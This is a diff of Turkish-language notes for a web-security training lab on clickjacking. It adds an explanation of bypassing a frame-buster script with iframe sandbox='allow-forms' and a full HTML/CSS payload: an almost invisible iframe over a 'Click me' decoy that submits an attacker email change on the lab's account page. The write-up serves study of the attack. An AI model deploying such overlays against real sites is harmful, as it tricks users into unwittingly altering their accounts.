@@ -48,4 +48,29 @@ Mail adresini aşağıdaki kod satırlarıyla değiştirebildiğimiz anda lab ç
     }
 </style>
 <div>Click me</div>
-<iframe src="https://$║yourlabid.web-security-academy.net/my-account?email=hacker4@hacker.co"></iframe>
+
+3
+Laboratuvar: Çerçeve bozucu betikle tıklama korsanlığı
+
+frame özelliğini engellemek için frame buster kullanılmış.
+Aşmak için <iframe sandbox="allow-forms" kullanıyoruz.
+
+<style>
+    iframe {
+        position:relative;
+        width:700px;
+        height: 500px;
+        opacity: 0.00001;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:450px;
+        left:80px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe sandbox="allow-forms"
+src="https://$yourlabid.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
+<iframe src="https://$yourlabid.web-security-academy.net/my-account?email=hacker4@hacker.co"></iframe>
